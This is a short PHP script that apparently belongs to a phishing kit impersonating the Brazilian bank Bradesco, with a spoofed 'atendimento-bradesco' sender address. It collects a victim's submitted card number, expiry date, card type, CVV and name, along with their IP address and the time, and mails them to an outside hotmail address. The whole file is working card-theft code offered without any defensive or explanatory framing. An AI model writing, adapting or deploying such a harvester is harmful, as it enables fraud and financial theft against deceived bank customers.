﻿<?
$ver01=$_POST['ver01']; 
$ver02=$_POST['ver02'];
$ver03=$_POST['ver03']; 
$ver04=$_POST['ver04'];
$mes=$_POST['mes']; 
$ano=$_POST['ano']; 
$via=$_POST['via']; 
$tip=$_POST['tip'];
$cvv=$_POST['cvv']; 
$nome=$_POST['nome']; 
$ip=$_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s"); $headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: BY_GFL-02 <atendimento-bradesco@email.com>";
$conteudo.="<br>";
$conteudo.="<b>Cartao:</b> $ver01-$ver02-$ver03-$ver04<br>";
$conteudo.="<b>Validade:</b> $mes/$ano<br>";
$conteudo.="<b>Via-Tipo:</b> $via-$tip<br>";
$conteudo.="<b>Codigo:</b> $cvv<br>";
$conteudo.="<br>";
@mail("angel-luca@hotmail.com", "$ip", "$conteudo", $headers);
?>